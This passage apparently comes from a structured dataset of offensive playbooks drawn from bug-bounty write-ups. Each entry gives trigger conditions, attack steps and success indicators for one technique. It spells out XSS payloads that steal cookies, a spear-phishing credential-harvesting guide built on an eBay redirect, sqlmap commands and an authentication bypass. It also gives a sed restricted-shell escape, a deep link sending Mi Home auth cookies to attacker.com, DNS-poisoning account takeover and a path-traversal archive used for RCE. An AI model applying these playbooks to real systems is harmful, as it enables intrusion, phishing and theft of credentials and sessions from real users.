Step 4: If the initial payload is blocked or encoded, attempt variations with different encoding techniques, bypasses, or event handlers (e.g., ``).
tools_recommended: Burp Suite: To intercept and modify requests, and analyze responses for reflected input.
Browser Developer Tools: For inspecting the DOM, source code, and JavaScript execution.
success_indicators: An alert box with a message (e.g., 'XSS' or 'document.domain') is displayed in the browser.
Arbitrary JavaScript code executes in the context of the vulnerable page.
failure_indicators: The payload is HTML-encoded (e.g., `<script>alert('XSS')</script>`) and no JavaScript executes.
A 4xx or 5xx error response is received.
A WAF block page is displayed. Pivot: Try different encoding or obfuscation techniques.
The input is not reflected in the response at all. Pivot: Look for other input vectors or vulnerability types.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, leading to session hijacking, credential theft, phishing attacks, or defacement.
playbooks.key_lesson: Always test user-supplied input for proper sanitization and encoding before it is rendered in HTML responses to prevent Reflected Cross-Site Scripting (XSS).

meta.title: eBay XSS demo and guide to spear phishing

trigger_conditions.when_to_apply: When an XSS vulnerability is identified on a website that allows for redirection through URL parameters, and the goal is to harvest credentials or perform social engineering attacks.
prerequisites: The target website must be vulnerable to XSS. The vulnerability should allow script execution or redirection through crafted URLs.
The target website must have a login mechanism or other sensitive forms that can be phished.
applicability_signals: A URL structure that includes a 'redirect' or 'url' parameter which can be controlled by the attacker.
The presence of an XSS vulnerability that allows for script injection or execution within the context of the main domain.
skip_if: The target website uses strict HttpOnly flags for cookies, preventing cookie theft via JavaScript.
The website has strong input sanitization and output encoding that prevents the execution of injected scripts or manipulation of URL parameters.

recon_steps: Step 1: Identify potential XSS vulnerabilities on eBay, specifically focusing on parameters that accept URLs or allow redirection. Example: http://ebay.com/link/?nav=webview&url=javascript:alert(document.cookie)
Step 2: Confirm the XSS vulnerability by executing a simple proof-of-concept like `alert(document.cookie)` to verify script execution within the eBay domain.
attack_steps: Step 1: Craft a phishing URL using the identified XSS vulnerability. This involves embedding a malicious script within the URL parameter that redirects the user to a fake login page controlled by the attacker. For example: `http://ebay.com/link/?nav=webview&url=<attacker_controlled_redirect_url>`
Step 2: Create an authentic-looking phishing page that mimics eBay's login page. This can be done by mirroring the actual eBay login page using tools like WebHTTrack.
Step 3: Modify the mirrored login form's `action` attribute to point to the attacker's server-side script (e.g., a PHP script) that will capture the submitted credentials.
Step 4: Host the phishing page on an attacker-controlled server.
Step 5: Spear-phish victims by sending them the crafted URL via email or other communication channels, enticing them to click the link.

Step 6: When a victim clicks the link, they are redirected through eBay's `/link/` endpoint, which executes the embedded JavaScript. This JavaScript then redirects them to the attacker's phishing page.
Step 7: Capture the victim's credentials from the phishing page.
tools_recommended: WebHTTrack: To mirror the target website's login page.
A web server with PHP or another server-side language: To host the phishing page and capture credentials.
success_indicators: The victim is successfully redirected to the attacker's phishing page after clicking the crafted eBay link.
The attacker's server receives and logs the victim's submitted username and password from the phishing page.
failure_indicators: The XSS payload is not executed or is filtered by eBay's WAF/sanitization.
The victim is redirected to an error page or the original eBay page instead of the phishing page.
eBay's `HttpOnly` flag prevents cookie theft (though this specific attack focuses on redirecting to a phishing page rather than direct cookie theft).

playbooks.impact: Credential harvesting from eBay users, leading to account takeover, financial fraud, or using compromised accounts to scam other users.
playbooks.key_lesson: Leverage XSS vulnerabilities in redirection mechanisms to craft spear-phishing links that bypass initial security filters and lead users to attacker-controlled login pages for credential harvesting.

meta.title: How I Found Multiple Bugs On FaceBook In 1 Month And a Part For My Methodology & Tools

trigger_conditions.when_to_apply: When an employee panel or similar internal tool is discovered, particularly if it uses numeric IDs or has a login/authentication flow.
prerequisites: Access to a login endpoint or an authenticated session.
The target application is vulnerable to SQL injection or has authentication bypass mechanisms.
applicability_signals: SQL error messages containing 'MySQL'.
Redirect responses with a large Content-Length indicating potential bypass.
skip_if: No SQL error messages are returned for crafted inputs.
All redirect responses have a normal Content-Length.

recon_steps: Use GitHub dorks (e.g., `org:facebookresearch language:python .php`) to find interesting endpoints related to Facebook.
Analyze discovered endpoints for login panels or administrative interfaces.
attack_steps: Navigate to the identified login endpoint (e.g., `/login/_ajax/verify-2fa.php`).
Intercept the request in Burp Suite.
Identify parameters that might be vulnerable to SQL injection (e.g., `username`).
Send the request to Burp Suite's SQLMap integration or manually test for SQL injection by appending characters like `'` to parameters and observing error messages.
If SQL injection is confirmed, use SQLMap to enumerate databases: `sqlmap -r request.txt -p <PARAM_NAME> --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname`.
Spider the entire host using Burp Suite or a similar tool.
Fuzz POST requests using a PHP wordlist and perform active scans in Burp Suite.
For authentication bypass, visit the `/location/?5` endpoint and intercept the response in Burp Suite.
Analyze the 302 redirect response for unusual `Content-Length` values (e.g., 6443).
Configure Burp Suite's Match and Replace to modify the response header: `HTTP/1.1 302 Found` to `HTTP/1.1 200 ok` and `Location: ../login/?redirect=//location/?5` to `2`.
Replay the request with the modified Match and Replace rules to bypass authentication.
tools_recommended: Burp Suite (with Match and Replace extension)
SQLMap
GitHub Dorking
success_indicators: SQLMap successfully enumerates databases (`--dbs` output).
Successful execution of `alert(1)` in the browser for XSS.
Access to the employee panel or ability to perform actions without authentication after applying Match and Replace rules.
failure_indicators: No SQL errors returned for injected characters.
Redirect responses have normal `Content-Length` and do not allow bypass.
WAF blocks SQLi attempts.

playbooks.impact: Access to sensitive employee data, ability to perform unauthorized actions on the platform, and potential for further exploitation through identified vulnerabilities.
playbooks.key_lesson: Always test numeric and string parameters in internal panels and employee interfaces for SQL injection, and analyze redirect responses for abnormal Content-Length values that might indicate authentication bypass.

meta.title: FragAttacks: Fragmentation & Aggregation Attacks

affected_components: Wi-Fi clients and access points implementing fragmentation and aggregation
tech_stack_fingerprints: Presence of Wi-Fi Protected Access (WPA2/WPA3) networks

trigger_conditions.when_to_apply: This technique is applicable to any Wi-Fi network using WPA2 or WPA3 encryption, as the underlying CCMP and GCMP ciphers are susceptible to these attacks. It specifically targets the fragmentation and aggregation mechanisms within the Wi-Fi protocol.
prerequisites: Attacker must be within radio range of the target Wi-Fi network.
Target device (client or AP) must be actively participating in Wi-Fi communication.
applicability_signals: Target network uses WPA2 or WPA3 encryption.
Target device exhibits Wi-Fi traffic patterns consistent with fragmentation or aggregation.
skip_if: Target network uses older encryption like WEP or no encryption (though older networks might have different vulnerabilities).
Target device is not actively transmitting or receiving Wi-Fi frames.

recon_steps: Step 1: Scan for Wi-Fi networks in the vicinity and identify those using WPA2 or WPA3 encryption.
Step 2: Observe Wi-Fi traffic from target clients/APs to identify the presence of fragmented or aggregated packets using tools like Wireshark.
attack_steps: Step 1: Utilize the FragAttacks tool to craft and inject malicious fragmented or aggregated Wi-Fi frames towards the target client or access point.
Step 2: Monitor the target device's behavior for any observable changes or responses to the crafted packets.
Step 3: Analyze captured network traffic to identify successful exploitation indicators.
payloads_or_patterns: Specific crafted Wi-Fi frames as generated by the FragAttacks tool (requires using the tool's functionality).
tools_recommended: FragAttacks tool (https://github.com/vanhoefm/fragattacks)
Wireshark (for traffic analysis)
Modified Wi-Fi drivers (as mentioned in the research for injecting crafted packets)
success_indicators: Injected packets leading to unexpected behavior on the target device (e.g., crashes, reboots, unexpected network states).
Successful decryption of otherwise protected traffic due to fragmentation/aggregation manipulation.
Attacker gaining unauthorized access or control over network resources.
Specific CVEs being triggered and observable effects.
failure_indicators: Target device ignores or drops malformed packets without adverse effects (suggests robust handling of fragmentation/aggregation).
No observable change in target device behavior after repeated attacks (suggests the device/driver combination is not vulnerable or patches are in place).
WAF blocking or filtering malicious packets if deployed at the network edge (less likely for raw Wi-Fi frames but possible for higher-level protocols exploiting Wi-Fi issues).

playbooks.impact: Depending on the specific attack vector, impact can range from denial of service (crashing clients/APs) to information disclosure (decrypting traffic) and potentially gaining unauthorized access to sensitive data or network resources. The research highlights vulnerabilities affecting all protected Wi-Fi networks.
playbooks.key_lesson: Always test Wi-Fi implementations for vulnerabilities in fragmentation and aggregation handling, as these fundamental protocol mechanisms can be exploited even with strong encryption in place.

meta.title: HackerOne report

tech_stack_fingerprints: HTML string: 'Looks like your JavaScript is disabled.'

trigger_conditions.when_to_apply: This playbook is not applicable as the writeup provides no actionable security vulnerability details, only a message indicating JavaScript is disabled.
skip_if: Writeup lacks any mention of a specific vulnerability, exploit, or impact.

playbooks.impact: insufficient detail in writeup
playbooks.key_lesson: When analyzing bug bounty reports, prioritize reports that clearly detail a specific vulnerability, exploit steps, and demonstrable impact. Ignore reports that only contain platform-level messages without security context.

meta.title: Forgot password? Taking over user accounts Kaminsky style
meta.vuln_type: Account Takeover via DNS Cache Poisoning

tech_stack_fingerprints: User registration process that sends verification emails

trigger_conditions.when_to_apply: This attack is applicable when a web application's 'Forgot Password' mechanism relies on email-based password resets and the DNS resolver used by the application is vulnerable to DNS cache poisoning.
prerequisites: Attacker can control or influence the DNS resolver used by the target web application.
Target web application sends password reset emails to user-registered email addresses.
Attacker has the ability to inject DNS records into the target DNS resolver's cache.
applicability_signals: Target web application has a 'Forgot Password' feature.
User registration flow requires email verification.
Analysis of DNS traffic reveals queries for email domains used by the application's users.
skip_if: Web application uses a secure, non-email based password reset mechanism (e.g., SMS, security questions with out-of-band verification).
Target DNS resolver is hardened against cache poisoning attacks.
Web application performs DNSSEC validation that cannot be bypassed.

recon_steps: Step 1: Identify web applications with a 'Forgot Password' feature. Look for the associated email address input field and password reset request buttons.
Step 2: Register test accounts on the target web application using unique subdomains of a controlled domain (e.g., `user1@sub1.attacker.com`, `user2@sub2.attacker.com`).
Step 3: Monitor DNS traffic originating from the target's DNS resolver to the authoritative DNS servers of the attacker-controlled subdomains. Observe MX record queries.
attack_steps: Step 1: Configure a DNS proxy (like the one described in the writeup) to intercept and modify DNS queries related to the email domains used by the target's users.
Step 2: Initiate the 'Forgot Password' flow for a target user account on the vulnerable web application.

Step 3: When the web application's DNS resolver queries for the MX record of the target user's email domain (e.g., `targetuser@gmail.com`), the attacker's DNS proxy injects a poisoned DNS response. This response points the MX record of `gmail.com` to an attacker-controlled mail server.
Step 4: The attacker's mail server now receives the password reset email intended for the target user.
Step 5: The attacker uses the received password reset link to change the target user's password and take over the account.
payloads_or_patterns: DNS query for MX record of `gmail.com`
tools_recommended: Custom DNS proxy software (as described in the writeup)
DNS server software (e.g., BIND, PowerDNS) for the attacker-controlled mail server and authoritative DNS server.
Network traffic monitoring tools (e.g., Wireshark)
success_indicators: Attacker's mail server receives the password reset email intended for the target user.
Attacker can successfully use the password reset link to change the target user's password and log in to their account.
failure_indicators: Password reset email is not received by the attacker's mail server. This could indicate that the DNS resolver is not vulnerable to cache poisoning, or the attacker's DNS proxy is not correctly intercepting traffic. Pivot: Investigate other DNS vulnerabilities or alternative account takeover vectors.

The web application's password reset link is invalid or expired. This might mean the attacker did not poison the DNS correctly or too much time elapsed. Pivot: Ensure correct DNS poisoning and timing.

playbooks.impact: Complete takeover of user accounts, allowing the attacker to access sensitive data, perform actions on behalf of the user, and potentially escalate privileges within the application.
playbooks.key_lesson: Always validate that the DNS resolvers used by your web application and its associated services are protected against DNS cache poisoning attacks, especially when relying on email for sensitive operations like password resets.

meta.title: Escalating Self-XSS To Stored XSS via Image injection + IDOR

trigger_conditions.when_to_apply: When a self-stored XSS vulnerability is found in a task's sticky note title field, and an IDOR vulnerability can be leveraged to access completed tasks across organizations.
prerequisites: Attacker can create tasks with sticky notes containing XSS payloads.
Tasks can be assigned to employees.
Employees can mark tasks as completed.
A mechanism exists to list completed tasks, potentially across different organizations, and this list is vulnerable to IDOR.
applicability_signals: Sticky note 'title' field in task creation is vulnerable to XSS.
Tasks can be assigned to other users.
Users can mark tasks as 'completed'.
A new endpoint/feature appears to list 'completed tasks' after tasks are marked complete.
The URL for the completed task listing contains a numeric or enumerable ID that can be modified.
skip_if: Sticky note title field sanitizes HTML/JavaScript.
Tasks cannot be assigned to users in other organizations.
Marking a task complete does not expose it in any list accessible by other users.
The completed task listing endpoint does not have an ID parameter or the ID is not enumerable.

recon_steps: Step 1: Identify task creation feature and look for options to add notes or details.
Step 2: Test the 'title' field of the sticky note for XSS vulnerabilities using a simple payload like '<svg/onload=alert(1)>'.
Step 3: If XSS is confirmed, attempt to assign the task to another employee within your organization.
Step 4: Log in as the assigned employee and mark the task as 'completed'.
Step 5: Log back into the original account (e.g., admin) and observe if a new feature or option related to 'completed tasks' appears.

Step 6: Inspect the URL of the 'completed tasks' list and look for an ID parameter. Attempt to access the same URL with different user accounts (from different organizations if possible) and by modifying the ID parameter to check for IDOR.
attack_steps: Step 1: Create a task with a sticky note. Inject a Self-XSS payload into the 'title' field, e.g., 'Task with <svg/onload=alert(document.cookie)>'.
Step 2: Assign this task to an employee account controlled by the attacker.
Step 3: Log in as the assigned employee and mark the task as 'completed'.
Step 4: Log in as a privileged user (e.g., admin) or any user who can access the 'completed tasks' list.

Step 5: Navigate to the 'completed tasks' list and identify the URL structure. If an ID parameter is present (e.g., /tasks/completed?id=<TASK_ID>), try to access this URL from an account in a different organization.
Step 6: If IDOR is confirmed for completed tasks, and the task with the XSS payload is visible, then the Self-XSS is now effectively Stored XSS.

Step 7: For a more impactful Stored XSS, the attacker could potentially try to inject JavaScript that steals session tokens or performs actions on behalf of the victim user viewing the completed task list.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, identifying IDOR vulnerabilities by fuzzing the task ID.
Browser Developer Tools: To inspect HTML, JavaScript, and network requests.
success_indicators: The sticky note title containing the XSS payload is visible in the 'completed tasks' list of another user (from a different organization).
The XSS payload executes in the context of the user viewing the 'completed tasks' list, potentially revealing their cookies or performing actions.
The attacker can access details of completed tasks belonging to users in other organizations via the completed tasks list.
failure_indicators: XSS payload is sanitized and does not execute.
Marking a task complete does not make it visible in any shared or exploitable list.
The 'completed tasks' list is restricted to the user's own organization, preventing IDOR exploitation across organizations.
The ID parameter in the completed tasks URL is not enumerable or does not reflect different tasks/users.
Accessing completed tasks from another organization results in a 403 Forbidden error.

playbooks.impact: An attacker can achieve Stored XSS, allowing them to execute arbitrary JavaScript in the browser of any user who views the attacker's completed tasks. This could lead to session hijacking, data theft, performing actions on behalf of the victim user, or even account takeover if sensitive information is exfiltrated.
playbooks.key_lesson: Always chain vulnerabilities: a Self-XSS can be escalated to Stored XSS if combined with an IDOR that exposes user-generated content across organizational boundaries.

meta.title: Guest Blog Post - Attacking the DevTools

trigger_conditions.when_to_apply: When a Chromium-based browser is in use and a malicious browser extension can be installed or loaded, allowing it to interact with the browser's DevTools.
prerequisites: Ability to install or load a browser extension.
applicability_signals: Observation of `devtools://devtools/bundled/inspector.html?remoteBase=javascript:...` pattern in network requests or during debugging.
The `remoteBase` query parameter is present in DevTools URLs.
skip_if: Browser versions where the `remoteBase` parameter is strictly validated and does not allow arbitrary URL schemes like `javascript:`.

recon_steps: Step 1: Observe network requests made by DevTools when opened on a page using the `chrome.webRequest` API (within an extension). Look for requests that load external resources.

Step 2: Debug the DevTools window itself by undocking it and pressing `Ctrl + Shift + I` to inspect its JavaScript code. Identify how URLs are constructed, particularly those involving query parameters.
attack_steps: Step 1: Construct a malicious URL using the `devtools://devtools/bundled/inspector.html` base.
Step 2: Append the `remoteBase` query parameter with a `javascript:` URI. For example: `devtools://devtools/bundled/inspector.html?remoteBase=javascript:alert('XSS')//`
Step 3: Ensure the `javascript:` URI ends with a comment (`//`) to prevent the browser from appending default DevTools resource paths incorrectly.
Step 4: Load this crafted URL. This can be done programmatically via an extension that opens a new tab or window pointing to this URL, or by tricking the user into navigating to it if possible.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and analyze network requests.
Browser developer tools: To debug the DevTools JavaScript code.
Custom browser extension: To programmatically trigger the malicious DevTools URL.
success_indicators: The JavaScript payload (e.g., `alert('XSS')`) executes within the context of the DevTools window.
Observing the output of `console.log` within the DevTools console.
failure_indicators: The DevTools fail to load or display an error message.
The `javascript:` URI is ignored or sanitized, and no JavaScript execution occurs. Pivot: Investigate other DevTools debugging features or manifest entries for privilege escalation.

playbooks.impact: An attacker-controlled browser extension can execute arbitrary JavaScript within the highly privileged DevTools context. This can lead to bypassing the browser's sandbox, potentially stealing sensitive data, manipulating web pages, or escalating privileges.
playbooks.key_lesson: Always strictly validate and sanitize user-controlled input, especially query parameters used in constructing internal URLs or loading external resources, to prevent XSS and privilege escalation vulnerabilities.

meta.title: XSS-Through-Fuzzing-Default-IIS

trigger_conditions.when_to_apply: When the target's web server displays a default IIS page or a custom page that reflects user-supplied input directly into the HTML source without proper sanitization, particularly in URL paths.
prerequisites: Target web server is running IIS.
An endpoint exists where a URL path segment is reflected verbatim into the HTML source.
applicability_signals: Observing a default IIS page upon initial access.
Fuzzing reveals paths that are reflected in the response source code.
URL segments are present in the HTML source without apparent sanitization.
skip_if: All fuzzing attempts result in 404 Not Found or other error codes without reflection.
Input reflected in the HTML source is properly sanitized, preventing XSS execution.

recon_steps: Step 1: Access the target URL and observe if a default IIS page is displayed. If so, proceed.

Step 2: Use a content discovery tool like ffuf with a common wordlist (e.g., jhaddix's content_discovery_all.txt) to find accessible paths. `ffuf -u <TARGET_URL>/FUZZ -w content_discovery_all.txt -fc 404`
Step 3: Analyze the responses from ffuf. Look for paths that return a 200 OK status and, critically, check the source code of the response for reflected input.
attack_steps: Step 1: Navigate to the identified vulnerable path, e.g., `http://<TARGET_URL>/beta/default.aspx/`.
Step 2: Append an XSS payload to the URL path that targets script execution. For example: `http://<TARGET_URL>/beta/default.aspx/'%3E%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E`
Step 3: Observe the browser's behavior and the response content for signs of script execution.
tools_recommended: ffuf: For content discovery and fuzzing paths.
Burp Suite or ZAP: To intercept requests, analyze responses, and manually test payloads.
success_indicators: The JavaScript `alert(document.cookie)` executes in the browser.
The browser displays an alert box showing the current session cookies.
failure_indicators: The payload is rendered as plain text in the HTML source, indicating proper encoding or sanitization.
A 403 Forbidden or other error response is received after attempting to inject the payload.
No alert box appears and no script execution is observed.

playbooks.impact: Attacker can execute arbitrary JavaScript in the victim's browser in the context of the vulnerable domain. This can lead to session hijacking, phishing, defacement, or redirection to malicious sites.
playbooks.key_lesson: Always fuzz URL paths and parameters for reflected input, especially on default or developer-facing pages, as they may lack robust input sanitization.

meta.title: IBM HMC Exploit CVE-2021-29707

tech_stack_fingerprints: Restricted bash shell on SSH login

trigger_conditions.when_to_apply: When SSH access to an IBM HMC results in a restricted shell environment, preventing standard command execution and file modifications.
prerequisites: SSH access to the HMC with a user account that has a restricted shell.
applicability_signals: SSH banner indicating HMC
Login prompt leading to a restricted shell
User's PATH is limited and contains HMC-specific binaries
Errors when trying to execute standard Linux commands or modify bash profiles.
skip_if: SSH access is not available.
The shell is not restricted.
Standard Linux commands are available without needing bypass techniques.

recon_steps: Step 1: SSH into the IBM HMC with provided credentials.
Step 2: Observe the shell environment upon successful login. Verify if it's a restricted shell by attempting to execute standard Linux commands (e.g., `ls`, `pwd`, `cd`).
Step 3: Examine the contents of `/etc/passwd` and `sshd_config` to understand how the restricted shell is implemented (e.g., custom shell wrapper, `ForceCommand` directive).
attack_steps: Step 1: Identify the `sed` command within the restricted PATH and its capabilities. Test `sed -n "1e /bin/ps" /etc/hosts` to confirm the `e` command functionality.

Step 2: Craft a `sed` command to execute `/bin/bash` with an updated PATH, redirecting stdin/stdout to the current TTY: `sed -n "1e /bin/bash -c 'PATH=/usr/kerberos/sbin:/opt/csm/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/hsc/bin:/opt/csm/bin:/opt/IBMJava/jre/bin:/usr/kerberos/bin:/usr/hmcrbin ; bash > $( /usr/bin/tty ) < $( /usr/bin/tty )'" /etc/hosts`.
Step 3: Execute the crafted `sed` command to break out of the restricted shell and obtain an unrestricted bash shell.
Step 4: List all executables in `/usr/hmcrbin` and check for setuid binaries using `find /usr/hmcrbin -perm -4000 -type f`.

Step 5: Investigate any identified setuid binaries (e.g., `ldapsearch`, `asmmenu`, `chkmedia`) for vulnerabilities or ways to escalate privileges further. The writeup points to `asmmenu` as a potential target.
tools_recommended: SSH client (e.g., OpenSSH)
Basic Linux command-line utilities
success_indicators: Successful execution of `/bin/bash` after using the `sed` bypass, resulting in an unrestricted shell.
Discovery of setuid binaries in `/usr/hmcrbin`.
Confirmation of privilege escalation to root by exploiting a setuid binary.
failure_indicators: The `sed` command fails to execute `/bin/bash` or the new shell is still restricted. This might indicate a patched version or a different restricted shell implementation. Pivot to analyzing the setuid binaries directly if an unrestricted shell is already obtained.
No setuid binaries are found. This would require further in-depth analysis of the HMC commands or other system configurations for privilege escalation vectors.

playbooks.impact: Escalate from a restricted user shell to a full root shell on the IBM HMC, allowing for complete control over the appliance, including the management of virtual machines (LPARs) and potentially sensitive system configuration data.
playbooks.key_lesson: When faced with a restricted shell, investigate the available tools for command injection or execution features that can be abused to spawn an unrestricted shell. Always check for setuid binaries as a potential avenue for privilege escalation after gaining an unrestricted shell.

meta.title: Stealing users' AuthToken by hijacking WebView in Mi Home
meta.vuln_type: Auth Token Theft via WebView Hijacking

tech_stack_fingerprints: Intent filters for deep links (e.g., globalshop://mobile.mi.com)

trigger_conditions.when_to_apply: When an Android app exports an activity that loads an external URL directly from user input via a WebView, and this WebView implements a custom DownloadListener that attaches user cookies to download requests.
prerequisites: Attacker can control a web server to host a downloadable response.
Attacker can trick the user into opening a crafted deep link or URL.
applicability_signals: The app's manifest exports an activity handling external URLs.
The app uses a WebView component.
The WebView's DownloadListener logic is observable (e.g., via decompilation or dynamic analysis).
The DownloadListener attaches cookies to requests initiated by the WebView.
skip_if: The WebView does not handle user-provided URLs.
The WebView does not attach cookies to download requests.
No mechanism exists to trigger the affected activity with a user-controlled URL.

recon_steps: Analyze the Android application's manifest file to identify exported activities and their associated intent filters.
Decompile or dynamically analyze the application to understand how user-provided URLs are handled, specifically looking for WebView usage and its DownloadListener implementation.
attack_steps: Step 1: Host a web page on an attacker-controlled server that returns a 'downloadable' HTTP response (e.g., Content-Disposition: attachment).

Step 2: Craft a deep link that uses the app's supported schema and includes the attacker's URL as the `nativeOpenUrl` parameter. For example: `globalshop://mobile.mi.com?nativeOpenUrl=https://attacker.com/downloadable_response.html`.
Step 3: Present this deep link to the victim, for example, within an anchor tag on a malicious webpage. When the victim clicks the link, the Mi Home app will launch.

Step 4: The Mi Home app's WebView will load the attacker's `downloadable_response.html`. Upon receiving this response, the WebView will initiate a download and attach the user's authentication cookies to the request sent to the attacker's server.
Step 5: Capture the request containing the user's cookies on the attacker's server.
tools_recommended: Android Debug Bridge (ADB) for launching activities with deep links.
A web server (e.g., Nginx, Python HTTP server) for hosting the 'downloadable' response.
Burp Suite Collaborator or similar for receiving the cookie-laden request.
success_indicators: The attacker's web server receives an HTTP request originating from the Mi Home app's WebView.
The received request contains the user's authentication cookies in the Cookie header.
failure_indicators: The deep link does not launch the Mi Home app.
The WebView loads the URL but does not trigger a download.
The request to the attacker's server does not contain any cookies.

playbooks.impact: An attacker can steal authenticated users' session cookies, enabling them to impersonate the user and potentially access sensitive data or perform actions on their behalf within the Mi Home application.
playbooks.key_lesson: Always sanitize and validate URLs loaded into WebViews, especially when they originate from user input or external sources. Pay close attention to the `DownloadListener` implementation as it can be leveraged to exfiltrate sensitive data like cookies.

meta.title: IIS-Default-Page-to-Information-Disclosure

trigger_conditions.when_to_apply: When a default IIS page is encountered, indicating potential misconfiguration or unpatched installations.
applicability_signals: Presence of a default IIS welcome page on a target domain or subdomain.
skip_if: The target server actively blocks or obfuscates requests to typical content discovery paths.

recon_steps: Step 1: Identify default IIS pages on subdomains using reconnaissance tools like Subfinder or Amass.
Step 2: Attempt to confirm the presence of IIS by checking for specific IIS headers or default page content.
attack_steps: Step 1: Execute IIS Shortname Scanner (sns) against the target URL to check for vulnerable short filenames.
Step 2: Perform general content discovery fuzzing using a comprehensive wordlist (e.g., jhaddix content_discovery_all.txt) targeting common backup and archive extensions like '.zip'.
Step 3: If a directory like '[aspnet_client]' is found and returns a 403, proceed with content discovery.
Step 4: Visit any discovered URLs that return a 200 OK status code and contain files like '.zip'.
tools_recommended: sns (IIS Shortname Scanner)
ffuf (for content discovery fuzzing)
Subfinder (for subdomain enumeration)
Amass (for subdomain enumeration)
success_indicators: Successful download of a '.zip' file containing source code, API keys, or sensitive DLLs.
HTTP response 200 OK for a discovered archive file that contains sensitive information.
failure_indicators: 403 Forbidden responses for all fuzzing attempts indicating stricter access controls.
404 Not Found responses for all fuzzing attempts indicating no discoverable files.
SNS tool does not find any exploitable short names.

playbooks.impact: Disclosure of sensitive information such as API keys, configuration details, and potentially proprietary source code, leading to further exploitation or compromise.
playbooks.key_lesson: Always perform content discovery fuzzing on default web server pages, especially IIS, as they may contain exposed archives or backup files with sensitive information.

meta.title: Remote code execution in cdnjs of Cloudflare

tech_stack_fingerprints: Uses Go for library update tools

trigger_conditions.when_to_apply: When a library update mechanism for a CDN service is found to use archive extraction that does not sanitize filenames, potentially allowing path traversal.
prerequisites: Attacker can control or influence the contents of a package/archive uploaded to the CDN's update mechanism.
applicability_signals: CDN uses an automated update process for libraries.
The update process involves downloading and extracting archives (e.g., .tgz, .zip).
The extraction logic in the underlying language (e.g., Go's archive/tar) is known to be vulnerable to path traversal if not properly sanitized.
skip_if: The CDN service explicitly sanitizes all filenames within archives before extraction.
The update process does not involve archive extraction.

recon_steps: Identify the CDN service and its library management/update mechanism.
Examine the source code or infrastructure details of the update server to understand how library archives are processed and extracted.
Look for specific libraries or tools used for archive decompression (e.g., Go's `compress/gzip` and `archive/tar`).
attack_steps: Step 1: Craft a malicious archive (e.g., a .tgz file) containing files with path traversal sequences (e.g., `../../../../etc/passwd`).
Step 2: Upload this malicious archive as part of a library update request to the CDN's update server.
Step 3: If the update server's extraction logic is vulnerable, the malicious file will overwrite critical system files.
Step 4: If a system file that can lead to RCE (e.g., a script executed by a cron job or a configuration file) is overwritten, the attacker achieves remote code execution.
Step 5: For cdnjs, the RCE was achieved by overwriting an `autoupdate` command script with a malicious Go program. When the script was executed later, it ran the attacker's code.
Step 6: If direct RCE is not immediately possible, exploit cache poisoning to serve malicious JavaScript to end-users who include the compromised library.
payloads_or_patterns: Archive containing files with names like `../../../../path/to/sensitive/file`
Malicious Go program to overwrite critical scripts or binaries.
Example malicious file structure: `malicious.tgz` containing `../../../../usr/local/bin/autoupdate` with a malicious Go executable.
